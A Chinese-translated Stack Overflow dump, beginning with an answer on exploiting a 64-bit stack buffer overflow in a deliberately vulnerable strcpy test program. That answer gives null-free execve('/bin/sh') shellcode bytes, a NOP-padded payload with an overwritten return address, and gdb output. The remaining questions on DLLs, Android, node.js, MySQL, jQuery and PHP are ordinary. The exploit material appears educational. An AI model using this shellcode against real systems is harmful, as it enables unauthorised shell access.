接下来确保您正在编译没有堆栈粉碎保护的测试程序并设置内存执行位。使用以下 gcc 选项编译它以完成
`-fno-stack-protector -z execstack`

此外，我发现我需要更多空间来实际执行 shell，所以我会将缓冲区更改为更像缓冲区 [64]

接下来就可以在gdb中运行app并获取需要返回的栈地址
首先在strcpy之后设置断点

```
(gdb) disassemble main
Dump of assembler code for function main:
   0x000000000040057c <+0>: push   %rbp
   0x000000000040057d <+1>: mov    %rsp,%rbp
   0x0000000000400580 <+4>: sub    $0x50,%rsp
   0x0000000000400584 <+8>: mov    %edi,-0x44(%rbp)
   0x0000000000400587 <+11>:    mov    %rsi,-0x50(%rbp)
   0x000000000040058b <+15>:    mov    -0x50(%rbp),%rax
   0x000000000040058f <+19>:    add    $0x8,%rax
   0x0000000000400593 <+23>:    mov    (%rax),%rdx
   0x0000000000400596 <+26>:    lea    -0x40(%rbp),%rax
   0x000000000040059a <+30>:    mov    %rdx,%rsi
   0x000000000040059d <+33>:    mov    %rax,%rdi
   0x00000000004005a0 <+36>:    callq  0x400450 <strcpy@plt>
   0x0000000000**4005a5** <+41>:    lea    -0x40(%rbp),%rax
   0x00000000004005a9 <+45>:    mov    %rax,%rsi
   0x00000000004005ac <+48>:    mov    $0x400674,%edi
   0x00000000004005b1 <+53>:    mov    $0x0,%eax
   0x00000000004005b6 <+58>:    callq  0x400460 <printf@plt>
   0x00000000004005bb <+63>:    mov    $0x0,%eax
   0x00000000004005c0 <+68>:    leaveq 
   0x00000000004005c1 <+69>:    retq   
End of assembler dump.
(gdb) b *0x4005a5
Breakpoint 1 at 0x4005a5 
```

然后运行应用程序并在断点处获取 rax 寄存器地址。

```
(gdb) run `python -c 'print "A"*128';`
Starting program: APPPATH/APPNAME `python -c 'print "A"*128';`

Breakpoint 1, 0x00000000004005a5 in main ()
(gdb) info register
rax            0x7fffffffe030   140737488347136
rbx            0x0  0
rcx            0x4141414141414141   4702111234474983745
rdx            0x41 65
rsi            0x7fffffffe490   140737488348304
rdi            0x7fffffffe077   140737488347255
rbp            0x7fffffffe040   0x7fffffffe040
rsp            0x7fffffffdff0   0x7fffffffdff0
r8             0x7ffff7dd4e80   140737351863936
r9             0x7ffff7de9d60   140737351949664
r10            0x7fffffffdd90   140737488346512
r11            0x7ffff7b8fd60   140737349483872
r12            0x400490 4195472
r13            0x7fffffffe120   140737488347424
r14            0x0  0
r15            0x0  0
rip            0x4005a5 0x4005a5 <main+41>
eflags         0x206    [ PF IF ]
cs             0x33 51
ss             0x2b 43
ds             0x0  0
es             0x0  0
fs             0x0  0
gs             0x0  0
(gdb) 
```

接下来确定您的最大缓冲区大小。我知道 64 的缓冲区在 72 字节处崩溃，所以我将从那个开始。你可以使用类似 metasploits 模式的方法来给你这个，或者只是通过运行应用程序的试验和错误来找出确切的字节在获得段错误或组成自己的模式之前计算它需要的时间，并像使用 metasploit 模式选项一样匹配 rip 地址。

接下来，有许多不同的方法可以获取您需要的有效负载，但由于我们运行的是 64 位应用程序，因此我们将使用 64 位有效负载。我编译了 C，然后从 gdb 中获取了 ASM，然后通过将 mov 指令更改为 xor 为空值，然后 shl 和 shr 将它们从 shell 命令中删除，进行了一些更改以删除 \x00 字符。我们稍后会展示这一点，但现在有效负载如下。

`\x48\x31\xd2\x48\x89\xd6\x48\xbf\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe7\x08\x48\xc1\xef\x08\x57\x48\x89\xe7\x48\xb8\x3b\x11\x11\x11\x11\x11\x11\x11\x48\xc1\xe0\x38\x48\xc1\xe8\x38\x0f\x05`

我们这里的有效负载是 48 字节，所以我们有 72 - 48 = 24

我们可以用 \x90 (nop) 填充有效载荷，这样指令就不会被中断。我将在有效载荷的末尾添加 2，在开头添加 22。另外，我将反向添加我们想要结束的返回地址，给出以下内容..

```
`python -c 'print "\x90"*22+"\x48\x31\xd2\x48\x89\xd6\x48\xbf\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe7\x08\x48\xc1\xef\x08\x57\x48\x89\xe7\x48\xb8\x3b\x11\x11\x11\x11\x11\x11\x11\x48\xc1\xe0\x38\x48\xc1\xe8\x38\x0f\x05\x90\x90\x30\xe0\xff\xff\xff\x7f"';` 
```

现在，如果您想在 gdb 之外运行它，您可能不得不对返回地址进行修改。在我的情况下，地址在 gdb 之外变为 \x70\xe0\xff\xff\xff\x7f。我只是增加了它，直到它通过去 40 然后 50 然后 60 然后 70 ..

测试应用源

```
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char name[64];

  strcpy(name, argv[1]);
  printf("Arg[1] is :%s\n", name);

  return 0;
} 
```

这是 C 中的有效载荷

```
#include <stdlib.h>

int main()
{
  execve("/bin/sh", NULL, NULL);
} 
```

ASM 中的有效载荷将构建和运行

```
int main() {
  __asm__(
    "mov    $0x0,%rdx\n\t"                // arg 3 = NULL
    "mov    $0x0,%rsi\n\t"                // arg 2 = NULL
    "mov    $0x0068732f6e69622f,%rdi\n\t"
    "push   %rdi\n\t"                     // push "/bin/sh" onto stack
    "mov    %rsp,%rdi\n\t"                // arg 1 = stack pointer = start of /bin/sh
    "mov    $0x3b,%rax\n\t"               // syscall number = 59
    "syscall\n\t"
  );
} 
```

并且由于我们不能使用 \x00 我们可以更改为 xor 值并进行一些花哨的转换以删除 mov 设置 /bin/sh 的错误值

```
int main() {
  __asm__(
    "xor    %rdx,%rdx\n\t"                // arg 3 = NULL
    "mov    %rdx,%rsi\n\t"                // arg 2 = NULL
    "mov    $0x1168732f6e69622f,%rdi\n\t"
    "shl    $0x8,%rdi\n\t"                
    "shr    $0x8,%rdi\n\t"                // first byte = 0 (8 bits)
    "push   %rdi\n\t"                     // push "/bin/sh" onto stack
    "mov    %rsp,%rdi\n\t"                // arg 1 = stack ptr = start of /bin/sh
    "mov    $0x111111111111113b,%rax\n\t" // syscall number = 59
    "shl    $0x38,%rax\n\t"         
    "shr    $0x38,%rax\n\t"               // first 7 bytes = 0 (56 bits)
    "syscall\n\t"
  );
} 
```

如果您编译该有效负载，请在 gdb 下运行它，您可以获得所需的字节值，例如

```
(gdb) x/bx main+4
0x400478 <main+4>:  0x48
(gdb) 
0x400479 <main+5>:  0x31
(gdb) 
0x40047a <main+6>:  0xd2
(gdb) 
```

或者通过做类似的事情来得到它

```
(gdb) x/48bx main+4
0x4004f0 <main+4>:  0x48    0x31    0xd2    0x48    0x89    0xd6    0x48    0xbf
0x4004f8 <main+12>: 0x2f    0x62    0x69    0x6e    0x2f    0x73    0x68    0x11
0x400500 <main+20>: 0x48    0xc1    0xe7    0x08    0x48    0xc1    0xef    0x08
0x400508 <main+28>: 0x57    0x48    0x89    0xe7    0x48    0xb8    0x3b    0x11
0x400510 <main+36>: 0x11    0x11    0x11    0x11    0x11    0x11    0x48    0xc1
0x400518 <main+44>: 0xe0    0x38    0x48    0xc1    0xe8    0x38    0x0f    0x05 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T20:25:54.033

那么对于初学者来说......您是否完全确定堆栈上的地址是返回指针而不是指向某处的数据结构或字符串的指针？如果是这种情况，它将使用该地址而不是字符串，并且最终可能什么都不做:)

因此，请检查您的函数是否使用局部变量，因为它们在返回地址之后被放入堆栈。希望这会有所帮助^_^ 祝你好运！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-21T16:49:01.993

我对 x64 的使用不多，但快速浏览一下说你有 16 个字节直到 rip overwrite。而不是 \x90 尝试 \xCC 来查看是否发生了受控代码重定向，如果它有 gdb 应该命中（降落在 \xCC 池中）\xCC 并暂停（\xCC 在某种程度上是“硬编码”断点）。

# vb.net - 替换 .NET dll

> ID：15533891
> 
> 赞同：2
> 
> 时间：2013-03-20T20:21:18.717
> 
> 标签：vb.net

我有一个 dll，它与我的应用程序的初始安装一起安装（通过 msi 文件）。该 dll 包含一个用户密钥，这是初始安装的“演示”。当用户购买许可证时，他会获得另一个包含其姓名的 dll。第二个 dll 只是第一个，用不同的名称重新构建，因此它是相同的 GUID 和文件名。这在我的 win7 测试机上运行良好，我可以替换我的应用程序目录中的 dll 并且它运行正常。我最近向新客户端提供了一个用户 dll，但替换方法似乎不起作用。他非常懂 IT，所以我认为他正在按照电子邮件中的说明进行操作（将您的应用程序目录中的 userdata.dll 替换为附件），它似乎并没有更改 dll。他正在使用Win8（专业版）。

我曾想过向他发送一个 Inno 设置以将用户 dll 复制到应用程序目录 Flags:ignorereversion regserver sharedfile

任何人都可以提出解决方案或解释吗？

稍后...我现在向他发送了更新的 dll 的 Inno 设置，这很有效。如果我使用第二种 dll 方法（一个好主意），我仍然需要让用户安装它。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T20:25:38.730

与其替换原来的 .dll，不如提供一个包含客户特定信息的*第二个.dll？*第二个 .dll 将解锁原始 .dll 中的功能。

例如，在您的原始 .dll 中，您可能会检查`Customer.dll`：

```
if(TryLoadAssembly("Customer.dll", out assembly)) {
    if(Validate(assembly)){
        IsUnlocked = true;
    }
} 
```

进一步的建议（*和未经测试的示例*） - 让 Customer.dll 包含实现接口的单个​​对象：

```
class Customer : IToken {
    GUID Guid {get;}
    // other fields
} 
```

验证：

```
bool Validate(Assembly assembly){
    Type type = assembly.GetType("Customer");
    IToken customerToken = (IToken)Activator.CreateInstance(type);

    // check some properties
    return customerToken.Guid == application.Guid;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T20:54:41.810

你说它似乎没有替换 DLL。是 UAC 将他的文件副本重定向到本地存储吗？

如果是这种情况，那么处理它的最简单方法是
1) 提供一个可以执行文件复制的批处理文件，以及通过右键单击该批处理文件并选择“以管理员身份运行”来启动该批处理文件的说明.
2）提供一个可执行文件复制。您可以像批处理文件一样包含以管理员身份运行 exe 的说明，也可以在应用程序中包含清单以指示文件需要以管理员身份执行的窗口。

最后一个可能值得进行故障排除的选项是让用户关闭 UAC 并再次尝试文件复制。如果可行，那么该用户会很高兴，并且您知道问题所在，并且可以为未来的客户找到一个优雅的解决方案。

我刚刚查看了我的 Win 8 笔记本电脑，UAC 的选项位于控制面板 - 用户帐户 - 用户帐户 - 更改用户帐户控制设置。这将提供一个滑块，该滑块可以一直滑到底部以关闭 UAC。
（用户帐户确实列出了两次。）

# android - Android 的调试密钥库已过期 - INSTALL_PARSE_FAILED_INCONSISTENT_CERTIFICATES- IntelliJ

> ID：15533895
> 
> 赞同：1
> 
> 时间：2013-03-20T20:21:40.103
> 
> 标签：android, intellij-idea, keystore

我正在使用 IntelliJ IDEA 12.0.4。

在将我的应用程序安装到我的模拟器和手机时，我反复收到 INSTALL_PARSE_FAILED_INCONSISTENT_CERTIFICATES 消息。

我相信错误是在我的 debug.keystore 过期时出现的，我通过卸载旧版本解决了模拟器上的问题。

但是我不想卸载手机上的应用程序，因为这会删除用户数据。

我还尝试使用我的发布密钥对应用程序进行签名，然后将其安装在手机上（通过复制 APK 文件并执行它）——但由于证书原因，该安装也被拒绝。那不应该没问题吗？

我该怎么办？

PS：为免生疑问-我只有一台开发PC，只有一张证书...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T20:26:54.357

Android 无法知道您的调试密钥是否与您的发布密钥相关。

如果您的应用程序可以访问 SD 卡，您可以使用命令提示符将数据文件复制到 SD 卡，使用类似这样的方法。

```
adb -d shell
run-as <packagename> sh
cp <files> /sdcard/ 
```

你的手机不需要 root 来执行此操作，但 run-as 仅适用于你的应用程序的调试版本。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T20:24:39.290

手机不知道某个东西是发布密钥还是调试密钥。它只知道它是用密钥签名的。所以不，您不能使用发布签名副本更新调试签名副本，除非您使用相同的密钥进行发布和调试。

这里没有真正的卸载方法。如果您的手机已植根，您可以将文件拉出并在新安装后恢复它们。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-12-18T10:15:25.830

旧安装的 .apk 与要安装的新 .apk 具有不同的证书。

所以解决方案是：

`uninstall the existing .apk` `and then re-install the new .apk`

# node.js - 如何从 node.js 网络错误中获取更大的堆栈跟踪？

> ID：15533900
> 
> 赞同：2
> 
> 时间：2013-03-20T20:21:57.990
> 
> 标签：node.js

我收到此错误：

```
Error: accept EMFILE
at errnoException (net.js:769:11)
at TCP.onconnection (net.js:1017:24) 
```

从 node.js 应用程序。我可以得到一个调用 TCP.onconnection 的代码的行号吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-20T21:06:52.143

不，你不能，因为你的代码没有调用`TCP.onconnection`. 那是一个事件处理程序，所以一个事件正在触发它。这是基于事件的编程难以调试的原因之一。

不过，我认为您会很幸运地了解该错误的含义。一些搜索显示您正在达到文件描述符限制，这可能会增加（但这将取决于操作系统，所以如果没有更多信息，我无法告诉您如何）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-20T21:55:37.797

当系统中打开的文件过多时会发生 EMFILE。要增加此限制，请查看[Linux 增加打开文件/文件描述符 (FD) 的最大数量](http://www.cyberciti.biz/faq/linux-increase-the-maximum-number-of-open-files/)或修改您的代码，以在其工作完成时关闭打开的连接。或者如果您需要打开太多文件，只需将此值增加到合理的大小。

# mysql - 无法在连接 node.js 上响应.write

> ID：15533905
> 
> 赞同：0
> 
> 时间：2013-03-20T20:22:04.910
> 
> 标签：mysql, node.js

我在 node.js 中编写了这段代码：

```
var http = require('http');
http.createServer(function (req, res) {
  res.writeHead(200, {'Content-Type': 'text/plain'});
    res.write('start\n');
    var mysql      = require('mysql');
    var connection = mysql.createConnection({
      host     : 'hostname',
      user     : 'user',
      password : 'pass',
      database : 'dbname',
    });

    connection.connect();

    connection.query('SELECT code FROM user_type', function(err, rows, fields) {
      if (err) throw err;
            //This for is to run on all the results
            for(var i=0;i<2;i++){
            res.write('name:',rows[i].code);
        }
    });

    connection.end();

  res.end('End');
}).listen(8080);
console.log('Server running'); 
```

我的问题是： 1\. 为什么 for 循环中的 res.write 在我的 html 页面中没有打印任何内容？2.在for中写什么而不是2？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-20T21:34:39.220

1.  问题是执行的时间。

    由于`connection.query()`是异步的，它会将回调的执行延迟`function`到查询完成时，但同时允许周围的代码块继续执行。这导致在`res.end('End')`之前执行`res.write('name:',rows[i].code)`。

    要延迟`res.end()`，请将其移动到回调中：

    ```
    connection.query(..., function(err, rows, fields) {
        if (err) throw err;

        for (...) {
            res.write('name:',rows[i].code);
        }
        res.end('End');
    }); 
    ```

2.  `rows``Array`当没有时应该是an `err`，所以你可以使用它的[`length`属性](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Array/length)：

    ```
    for (var i = 0; i < rows.length; i++) { 
    ```

    `length`将 的值存储在局部变量中也是一种常见的做法：

    ```
    for (var i = 0, len = rows.length; i < len; i++) { 
    ```

# javascript - 监听 div 上的点击，但当它的任何子级被点击时不监听

> ID：15533909
> 
> 赞同：3
> 
> 时间：2013-03-20T20:22:15.463
> 
> 标签：javascript, jquery, javascript-events

我试图在单击 div 时隐藏 div 及其子级，但不是在其任何子级发生任何事件时；例如，滑动、点击或单击。

点击时隐藏 div 的 jQuery 很简单：

```
$("#tabs").click(function(){
    $(this).fadeOut();
}); 
```

但我注意到当它的孩子被点击或滑动时，div 会淡出。

当这些事件发生在其子级上时，如何防止 div 淡出，但允许它仅在其自身的点击时淡出？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-03-20T20:22:55.440

检查单击的元素是否与绑定的元素相同：

```
$("#tabs").click(function(e){
    if (e.target == this)
        $(this).fadeOut();
}); 
```

# magento - Magento 中的 Google Trusted Stores Shipmet Feed 运营商

> ID：15533912
> 
> 赞同：0
> 
> 时间：2013-03-20T20:22:22.977
> 
> 标签：magento, trusted, google-trusted-stores

我对发送到我的 Google 商家帐户 (order_shipments.txt) 的提要有问题，有 4 列

商家订单 ID 跟踪号 承运人代码 其他承运人名称 发货日期

我已使用免费送货的 magento 送货方式将我的送货设置为免费送货，问题是在我的提要下，所有跟踪号都显示为承运人（其他），而我需要在我的提要下使用 UPS 或 USPS 的承运人。因为每次我们发货时，我们都会输入运单号和承运人。任何建议将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-09-21T03:52:06.917

希望我不会太晚！

我们刚刚修补了这个确切的问题（以及其他问题），并在[http://www.dcjcooltools.com/blog/magento-extensions/the-nightmare-that-is-google-trusted-stores-for记录了必要的修改-magento/](http://www.dcjcooltools.com/blog/magento-extensions/the-nightmare-that-is-google-trusted-stores-for-magento/)

在讨论运营商名称的评论中查找帖子。我们正在寻求创建一个补丁扩展，这样您就不必修改核心 Trusted Stores 文件。

让我知道此解决方案是否适合您！

问候， 埃文

# php - 如何在PHP中获取当前路径

> ID：15533913
> 
> 赞同：-1
> 
> 时间：2013-03-20T20:22:23.693
> 
> 标签：php

如何返回当前页面的路径，包括之后的内容？

所以例如我是这个链接

```
localhost/site1/index.php?view=10&user=5 
```

我想返回这个值`"index.php?view=10&user=5"`

我怎样才能使用 PHP 做到这一点？

我想`$_SERVER['SCRIPT_NAME']`这样做但`SCRIPT_NAME`正在返回 index.php

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-20T20:24:50.370

`$_SERVER['QUERY_STRING']`

和

`$_SERVER['REQUEST_URI']`

request uri 会给你完整的 uri，你可以操纵它来获得最后的路径

正如@Mathieu Imbert 所说，好奇吧。`$_SERVER`通过`var_dump`或阅读我在评论中链接到的文档来检查所有内容

# php - 使用纯 PHP 在现有的 Google 电子表格中插入行

> ID：15533916
> 
> 赞同：3
> 
> 时间：2013-03-20T20:22:42.477
> 
> 标签：php, google-drive-api, google-spreadsheet-api

我有一个具有特定 ID 的现有 Google 电子表格（见 URL）。

我想用简单的代码从 PHP 脚本中添加行。

我宁愿不必添加庞大的库来做到这一点。是否可以仅使用 CURL 或一些小型库来做到这一点？

最简单的方法是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T01:02:55.043

选项：

1）使用谷歌应用程序脚本（java脚本）创建一个插入行的网络应用程序。然后插入行，使用 url。您可以在 url 中将参数传递给应用程序。

2) 有 Zend，请参阅： [Writing to Google Docs Spreadsheet using PHP](https://stackoverflow.com/questions/7390557/writing-to-google-docs-spreadsheet-using-php?rq=1) 我认为它有一个追加行功能，而不是一个插入行，但我可能错了。（我想知道您是否找到插入行）。它使用（gdata）电子表格API（插入行存在一个未解决的问题，目前您只能追加行）

请注意，对于插入一行，我怀疑选项 1 的工作量少于选项 2。

# javascript - 如何将项目动态添加到 Dojo AndOrReadStore

> ID：15533918
> 
> 赞同：1
> 
> 时间：2013-03-20T20:22:47.797
> 
> 标签：javascript, dojox.grid.datagrid, dojo

我有一个由`AndOrWriteStore`数据存储支持的 Dojo(1.7) 数据网格。目前，数据网格是静态的，即存储从 JSON 数据源初始化一次，网格在屏幕上填充。这一切都很好。

但是，如何动态地将数据添加到网格中？即在用一些数据初始化后添加一个项目。我试图环顾四周，但没有成功。

# java - 如何在 jdialog 的 ok 选项上设置 actionlistener？

> ID：15533920
> 
> 赞同：1
> 
> 时间：2013-03-20T20:22:55.633
> 
> 标签：java, swing, actionlistener, jdialog

嗨，我想在按下 jdialog 的 ok 按钮时触发一些动作，我知道你可以这样做

```
int rep =JOptionPane.showConfirmDialog(null, pangesfac, "Gestion des chambres a facturer", JOptionPane.OK_CANCEL_OPTION, JOptionPane.PLAIN_MESSAGE);
    if(rep == JOptionPane.OK_OPTION) {//actions to do} 
```

但在我的情况下，我想要一个外部控制器来处理按下确定按钮时必须完成的事情（我的代码由 mvc 构成）。那么如何在确定按钮上设置一个动作监听器呢？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-20T20:38:39.400

这是可能的，但并不像将 ActionListener 添加到 OK 按钮那么简单。您必须使用 PropertyChangeListener。

此页面上显示了一个示例：http: [//docs.oracle.com/javase/tutorial/uiswing/components/dialog.html#stayup](http://docs.oracle.com/javase/tutorial/uiswing/components/dialog.html#stayup)

但是，您可能需要重新考虑您的设计。您仍然可以将结果从 JOptionPane 传递到您的控制器，而无需捕获事件本身。

# jquery - 如何使用 JQuery 的事件处理程序使用带有提交按钮的文本框？

> ID：15533921
> 
> 赞同：1
> 
> 时间：2013-03-20T20:22:58.723
> 
> 标签：jquery

我是一个新的 JQuery 用户，我的任务是通过文本框和 Web 浏览器窗口上的提交按钮作为添加到无序列表末尾的列表项提交文本。

**HTML：**

```
 <ul class="list">
      <li></li> 
 </ul> 
```

**JS：**

```
 var text = $('text');
 var submit = $('submit'); 
```

问题：我将使用哪些 JQuery 事件处理程序来提交文本框中的文本并使用 HTTP 请求将我的文本提交到服务器？

任何建议和编码示例将不胜感激！谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-20T20:26:50.900

实际上，课程是：

```
var text   = $('.text');
var submit = $('.submit'); 
```

然后你会这样做：

```
submit.on('click', function(e) {
   e.preventDefault();
   $.ajax({
       url : '/server/myURL/',
       type: 'POST',
       data: {myData : text.val()}
   });
}); 
```

ETC...

阅读文档并查看 SO 上的答案以了解更多信息？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-20T20:26:32.460

创建一个表单，将所有表单字段放入其中，然后绑定提交按钮

```
var text   = $('.text');
var submit = $('.submit');

submit.click(function(){
     $.ajax({
        url : 'yourServerURL',
        type: 'POST',
        data:  text.val()
     });
}); 
```

# html - 在带有链接的 html5 音频播放器上设置当前时间

> ID：15533922
> 
> 赞同：0
> 
> 时间：2013-03-20T20:22:58.753
> 
> 标签：html, audio, youtube, timestamp

有谁知道如何通过单击带有时间的链接来设置 html5 音频的 currentTime 属性？类似于 Youtube 的做法吗？假设我单击“3:10”链接，它会立即将当前播放音频的 currentTime 更改为 3:10。

```
<audio controls loop class="sound">
    <source src="../../site/music/music1.mp3"/>
    <source src="../../site/music/music2.ogg"/>
</audio>

Lorem ipsum dolor sit amet, <b><a>3:10</a></b> consectetur adipiscing elit. 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T12:31:46.433

很简单，只需使用or 标签的*currentTime属性即可。*

**注意：**
- 当前时间以秒而不是分钟为单位设置。所以 3:10 表示第二个 190。
- 您应该为您的音频/视频示例提供一个 ID：

```
<audio id="myAud" controls loop class="sound"> 
<a href="#" onClick="{myAud.currentTime=190;}">Set CurTime</a> 
```

# mysql - MySQL - 按月查找前 10 条记录

> ID：15533929
> 
> 赞同：1
> 
> 时间：2013-03-20T20:23:08.920
> 
> 标签：mysql, group-by, union

我将以表结构作为序言：

revshare r ：包含购买信息，包括订单号、销售额、佣金、itemid、EventDate

Products p：包含产品的相关信息，包括 PID（产品 ID），用于加入 Merchants 表以获取 Merchant 信息。

Merchants m：包含有关购买产品的商家的信息，包括 MerchantName

**问题**

我正在尝试创建一个 MySQL 查询来提取给定月份按佣金总和排序的前 10 个 itemid。我想获得的整个数据集来自 2011-2013 年，因此每年将填充 120 条记录（每月 10 条）。

我创建了一个查询来提取 1 个月的数据，并计划使用 UNION ALL 来创建一个记录列表，其中包含来自每个查询的 10 条记录（每个单独的查询代表一个月的前 10 个 itemid）。

**查询1**

此查询根据给定月份期间这些项目的总佣金准确地返回我前 10 个 itemid。

```
SELECT 
m.MerchantName, 
Count(r.OrderNo), 
sum(r.commission)

FROM revshare r
LEFT JOIN Products p ON r.itemid = p.PID
LEFT JOIN Merchants m ON p.MID = m.MID

WHERE r.EventDate between '2011-01-01' and '2011-01-31'

GROUP by r.itemid
ORDER by 3 DESC LIMIT 10 
```

当我尝试将此查询与另一个查询联合时，以便我可以在“2011-02-01”和“2011-02-31”之间获取下个月的记录，我收到错误消息“错误：UNION 和 ORDER BY 的使用不正确”我知道这是因为显然您不能在除最后一个之外的任何 UNION 查询集上使用 ORDER BY。我可以提取整个数据集，然后使用 Excel 或 Pentaho BI 仅显示前 10 名，但基于 revshare 表中的庞大数据集，这效率不高。

下面是 UNION ALL 不起作用的查询。有没有人有更好的方法来提取这些数据？

任何帮助是极大的赞赏。

问候，-克里斯

**查询 2（由于 ORDER BY 语句而不起作用）**

```
SELECT 
m.MerchantName, 
Count(r.OrderNo), 
sum(r.commission)

FROM revshare r
LEFT JOIN Products p ON r.itemid = p.PID
LEFT JOIN Merchants m ON p.MID = m.MID

WHERE r.EventDate between '2011-01-01' and '2011-01-31'

GROUP by r.itemid
ORDER by 3 DESC LIMIT 10

UNION ALL

SELECT 
m.MerchantName, 
Count(r.OrderNo), 
sum(r.commission)

FROM revshare r
LEFT JOIN Products p ON r.itemid = p.PID
LEFT JOIN Merchants m ON p.MID = m.MID

WHERE r.EventDate between '2011-02-01' and '2011-02-31'

GROUP by r.itemid
ORDER by 3 DESC LIMIT 10 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-20T21:29:49.423

好的，试试这个......

```
SELECT * FROM (
  SELECT 
    m.MerchantName, 
    Count(r.OrderNo), 
    sum(r.commission)
  FROM
    revshare r
    LEFT JOIN Products p ON r.itemid = p.PID
    LEFT JOIN Merchants m ON p.MID = m.MID
  WHERE
    r.EventDate between '2011-01-01' and '2011-01-31'
  GROUP by
    r.itemid
  ORDER by 
    3 DESC LIMIT 10
) AS RESULT1

UNION ALL

SELECT * FROM (
  SELECT 
    m.MerchantName, 
    Count(r.OrderNo), 
    sum(r.commission)
  FROM
    revshare r
    LEFT JOIN Products p ON r.itemid = p.PID
    LEFT JOIN Merchants m ON p.MID = m.MID
  WHERE
    r.EventDate between '2011-02-01' and '2011-02-31'
  GROUP by
    r.itemid
  ORDER by
    3 DESC LIMIT 10
) AS RESULT2 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-20T21:26:57.870

由于您已经开始了`union`一起 ing 查询的路径，因此这是正确的方法：

```
select t.*
from ((SELECT '2011-01' as yyyymm, m.MerchantName, Count(r.OrderNo) as cnt, sum(r.commission) as comm
       FROM revshare r LEFT JOIN
            Products p
            ON r.itemid = p.PID LEFT JOIN
            Merchants m
            ON p.MID = m.MID
       WHERE r.EventDate between '2011-01-01' and '2011-01-31'
       GROUP by r.itemid
       ORDER by comm DESC
       LIMIT 10
      ) union all
      (SELECT '2011-02' as yyyymm, m.MerchantName, Count(r.OrderNo) as cnt, sum(r.commission) as comm
       FROM revshare r LEFT JOIN
            Products p
            ON r.itemid = p.PID LEFT JOIN
            Merchants m
            ON p.MID = m.MID
       WHERE r.EventDate between '2011-02-01' and '2011-02-28'
       GROUP by r.itemid
       ORDER by comm DESC LIMIT 10
      ) union all
      . . .
     ) t
order by 1, comm desc 
```

换句话说，您需要为`union all`. 请注意，我还添加了`yyyymm`标识月份。

# actionscript-3 - 按下按钮 AS3 移动影片剪辑

> ID：15533934
> 
> 赞同：0
> 
> 时间：2013-03-20T20:23:29.057
> 
> 标签：actionscript-3

有谁知道如何通过单击舞台上的按钮来移动影片剪辑。我可以让它逐步移动，但我希望它不断移动。目前我有这个：

```
down.addEventListener(MouseEvent.MOUSE_DOWN, arrowDown);

function arrowDown(event:MouseEvent):void
{
bottomArrow.y += 1;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T21:00:04.623

首先，您应该听`KeyboardEvent`s 而不是`MouseEvent`. 那么我认为你应该监听那些由`stage`.

这是使用`Event.ENTER_FRAME`事件的示例。如果您想更好地控制精灵移动的速度，您可能需要使用计时器。

此示例在按下向下箭头时有效，但您可以`Keyboard.DOWN`使用任何您想要的键进行更改。

```
stage.addEventListener(KeyboardEvent.KEY_DOWN, onKeyDown);
stage.addEventListener(KeyboardEvent.KEY_UP, onKeyUp);

function onKeyDown(event:KeyboardEvent):void
{
    if (event.keyCode == Keyboard.DOWN)
    {
        stage.addEventListener(Event.ENTER_FRAME, onEnterFrame);
    }
}

function onKeyUp(event:KeyboardEvent):void
{
    if (event.keyCode == Keyboard.DOWN)
    {
        stage.removeEventListener(Event.ENTER_FRAME, onEnterFrame);
    }
}

function onEnterFrame(event:Event):void
{
    bottomArrow.y += 1;
} 
```

# algorithm - 伪随机的一对一 int32->int32 函数

> ID：15533937
> 
> 赞同：7
> 
> 时间：2013-03-20T20:23:31.607
> 
> 标签：algorithm, random, integer, bijection

我正在寻找一个 int32->int32 函数

*   双射（一一对应）
*   至少在一个方向上计算便宜
*   将递增的序列 0, 1, 2, 3, ... 转换为看起来像一个很好的伪随机序列的序列（当参数变化很小时，~半位翻转，没有明显的模式）

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-03-20T20:29:15.167

乘以一个大的奇数并与一个不同的数异或。

双射：奇数的乘法逆模幂为 2，因此乘法通过乘以逆来取消。当然，xor 会被另一个 xor 撤销。

这基本上就是线性同余伪随机数生成器的工作原理。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-20T21:19:21.420

对于这项任务来说可能有点过头了，但是您是否考虑过应用任何来自[分组密码的加密](http://en.wikipedia.org/wiki/Block_cipher)[伪随机排列](http://en.wikipedia.org/wiki/Pseudorandom_permutation)或其他原语。例如，可以在计数器模式下使用带有已知键的 des 来完成：

```
younumber xor (des (key, number counter)) 
```

# google-maps - 带有 STATIC 图像地图 api 的虚假“此网站需要不同的 Google Maps API 密钥”

> ID：15533949
> 
> 赞同：2
> 
> 时间：2013-03-20T20:24:22.537
> 
> 标签：google-maps, google-maps-api-2

从最近开始，我尝试从 Google Static Map API 获取静态图像的任何请求都会收到以下文本响应：

> 此网站需要不同的 Google Maps API 密钥

根据文档[https://developers.google.com/maps/documentation/staticmaps/#Limits](https://developers.google.com/maps/documentation/staticmaps/#Limits)

> 请注意，虽然建议使用密钥，但不需要使用密钥。本文档中的示例不包含 key 参数，因此它们适用于所有剪切和粘贴代码的用户。

